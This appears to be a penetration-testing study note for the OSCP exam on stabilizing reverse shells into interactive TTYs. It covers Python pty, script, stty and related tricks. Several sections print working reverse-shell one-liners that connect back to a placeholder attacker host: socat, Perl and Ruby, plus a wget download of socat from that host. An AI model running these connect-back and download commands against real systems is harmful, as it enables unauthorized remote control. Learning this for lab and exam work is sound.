# TTY Shell Stabilization

tags: #Post_Exploitation #Shells #Linux #Foundational

resources: [HackTricks Shells](https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/full-ttys)

> [!info] Methods to upgrade a basic reverse shell to a fully interactive TTY shell with tab completion, command history, and proper signal handling.

## Why Stabilize Shells?

### Problems with Basic Shells

```plaintext
❌ No tab completion
❌ No command history (arrow keys)
❌ No text editors (vim, nano)
❌ Ctrl+C kills the shell
❌ No job control (Ctrl+Z)
❌ Weird terminal behavior
❌ No proper error messages
```

### Benefits of Stabilized Shells

```plaintext
✅ Tab completion works
✅ Arrow keys for history
✅ Can use vim, nano, less
✅ Ctrl+C works properly
✅ Job control (fg, bg)
✅ Proper terminal size
✅ Better overall experience
```

## Method 1: Python PTY (Most Common)

### Step 1: Spawn PTY Shell

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

```bash
# Python 3
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

### Step 2: Background the Shell

```bash
# Press Ctrl+Z to background
^Z
```

### Step 3: Configure Local Terminal

```bash
stty raw -echo; fg
```

> [!important] After pressing Enter, the shell will return but you won't see your typing. This is normal!

### Step 4: Reset Terminal

```bash
reset
```

```bash
# Or specify terminal type
export TERM=xterm
```

### Step 5: Set Terminal Size (Optional)

```bash
# On your Kali machine, check size
stty size
# Output: 24 80

# On target, set the same size
stty rows 24 columns 80
```

### Complete Workflow

```bash
# 1. Spawn PTY
python3 -c 'import pty; pty.spawn("/bin/bash")'

# 2. Background (Ctrl+Z)
^Z

# 3. Configure terminal
stty raw -echo; fg

# 4. Reset and configure
reset
export TERM=xterm
export SHELL=bash

# 5. Set size (optional)
stty rows 24 columns 80
```

## Method 2: Script Command

### Using script

```bash
script /dev/null -c bash
```

```bash
# Alternative
/usr/bin/script -qc /bin/bash /dev/null
```

### Then Stabilize

```bash
# Background with Ctrl+Z
^Z

# Configure
stty raw -echo; fg

# Reset
reset
export TERM=xterm
```

## Method 3: Socat (Best Method)

> [!tip] Socat provides the most stable shell but requires socat on the target.

### If Socat is on Target

```bash
# On Kali - Listener
socat file:`tty`,raw,echo=0 tcp-listen:4444
```

```bash
# On Target - Connect back
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<KaliIP>:4444
```

### If Socat is NOT on Target

```bash
# On Kali - Start HTTP server
python3 -m http.server 80

# On Target - Download socat
wget http://<KaliIP>/socat -O /tmp/socat
chmod +x /tmp/socat

# On Kali - Listener
socat file:`tty`,raw,echo=0 tcp-listen:4444

# On Target - Connect
/tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<KaliIP>:4444
```

## Method 4: Perl

```bash
perl -e 'exec "/bin/bash";'
```

```bash
# Alternative
perl -e 'use Socket;$i="<KaliIP>";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
```

## Method 5: Expect

```bash
# Create expect script
cat > /tmp/shell.exp << 'EOF'
#!/usr/bin/expect
spawn bash
interact
EOF

chmod +x /tmp/shell.exp
/tmp/shell.exp
```

## Method 6: Ruby

```bash
ruby -e 'exec "/bin/bash"'
```

```bash
# Alternative
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("<KaliIP>","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

## Method 7: Lua

```bash
lua -e "os.execute('/bin/bash')"
```

## Method 8: AWK

```bash
awk 'BEGIN {system("/bin/bash")}'
```

## Method 9: Find Command

```bash
find / -name blah -exec /bin/bash \;
```

## Method 10: Vi/Vim

```bash
# Open vim
vim

# In vim, type:
:set shell=/bin/bash
:shell
```

## Quick Stabilization (One-Liner)

### Python Method

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")' && export TERM=xterm
```

### Then manually do:

```bash
# Ctrl+Z
stty raw -echo; fg
# Enter twice
reset
```

## Checking Shell Type

```bash
# Check if shell is interactive
echo $-
# Output with 'i' means interactive

# Check shell type
echo $SHELL

# Check if PTY
tty
# Output: /dev/pts/0 (good)
# Output: not a tty (bad)
```

## Fixing Common Issues

### Tab Completion Not Working

```bash
# Ensure bash is running
bash

# Source bashrc
source ~/.bashrc

# Or
. ~/.bashrc
```

### Arrow Keys Show ^[[A

```bash
# Reset terminal
reset

# Set TERM
export TERM=xterm

# Or try
export TERM=xterm-256color
```

### Ctrl+C Kills Shell

```bash
# Need to do full stabilization
# Background with Ctrl+Z
stty raw -echo; fg
```

### Terminal Size Wrong

```bash
# On Kali
stty size
# Output: 50 200

# On target
stty rows 50 columns 200
```

### Can't Use Vim/Nano

```bash
# Stabilize shell first
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
reset
export TERM=xterm
```

## Complete Stabilization Checklist

```plaintext
☐ Spawn PTY (python, script, etc.)
☐ Background shell (Ctrl+Z)
☐ Configure terminal (stty raw -echo; fg)
☐ Reset terminal (reset)
☐ Set TERM variable (export TERM=xterm)
☐ Set SHELL variable (export SHELL=bash)
☐ Set terminal size (stty rows X columns Y)
☐ Test tab completion
☐ Test arrow keys
☐ Test Ctrl+C (should work)
☐ Test vim/nano
```

## Troubleshooting

### Python Not Available

```bash
# Try python3
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Try script
script /dev/null -c bash

# Try other methods (perl, ruby, etc.)
```

### stty Command Not Found

```bash
# Skip the stty step
# Just use: python3 -c 'import pty; pty.spawn("/bin/bash")'
# Then: export TERM=xterm
```

### Shell Becomes Unresponsive

```bash
# If shell freezes after stty raw -echo; fg
# Just press Enter a few times
# Type 'reset' and press Enter
# Type 'export TERM=xterm' and press Enter
```

### Lost Shell After Ctrl+Z

```bash
# Bring it back to foreground
fg

# If that doesn't work, check jobs
jobs

# Bring specific job to foreground
fg %1
```

## OSCP Exam Tips

> [!tip] In OSCP exam:
> - Stabilize shells immediately after getting them
> - Python method works 99% of the time
> - Practice the muscle memory: python → Ctrl+Z → stty → fg → reset
> - Don't waste time if stabilization fails, just work with basic shell

### Quick Exam Workflow

```bash
# 1. Get reverse shell
nc -lvnp 4444

# 2. Immediately stabilize
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
# Enter, Enter
reset
export TERM=xterm

# 3. Continue enumeration
```

## Shell Upgrade Decision Tree

```plaintext
Got reverse shell?
├─ Python available?
│  ├─ Yes → Use Python PTY method
│  └─ No → Try script command
├─ Script available?
│  ├─ Yes → Use script method
│  └─ No → Try other languages
└─ Nothing works?
   └─ Work with basic shell (it's okay!)
```

## Alternative Shells

### Bash Interactive

```bash
bash -i
```

### Zsh Interactive

```bash
zsh -i
```

### Sh Interactive

```bash
sh -i
```

## Testing Stabilization

```bash
# Test tab completion
cd /et[TAB]
# Should complete to /etc/

# Test arrow keys
# Press up arrow
# Should show previous command

# Test Ctrl+C
ping 8.8.8.8
# Press Ctrl+C
# Should stop ping, not kill shell

# Test vim
vim test.txt
# Should open vim properly
```

## Common Mistakes

```plaintext
❌ Forgetting to press Enter after 'fg'
❌ Not typing 'reset' after stty
❌ Forgetting to export TERM
❌ Not setting terminal size
❌ Giving up too quickly
```

## Best Practices

```plaintext
✅ Stabilize immediately after getting shell
✅ Use Python method first (most reliable)
✅ Set TERM and SHELL variables
✅ Set proper terminal size
✅ Test stabilization before continuing
✅ Document what worked for future reference
```

## Quick Reference

### Python PTY (Most Common)

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
^Z
stty raw -echo; fg
reset
export TERM=xterm
```

### Script Method

```bash
script /dev/null -c bash
^Z
stty raw -echo; fg
reset
export TERM=xterm
```

### Socat Method (Best)

```bash
# Kali
socat file:`tty`,raw,echo=0 tcp-listen:4444

# Target
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<KaliIP>:4444
```

### One-Liner Spawns

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
perl -e 'exec "/bin/bash";'
ruby -e 'exec "/bin/bash"'
lua -e "os.execute('/bin/bash')"
awk 'BEGIN {system("/bin/bash")}'
find / -name blah -exec /bin/bash \;
```

## Summary

> [!important] Shell stabilization is crucial for:
> - Efficient enumeration
> - Running privilege escalation scripts
> - Using text editors
> - Better overall experience
> - Not accidentally killing your shell

> [!tip] Master the Python PTY method - it works in 99% of cases and takes only 10 seconds!
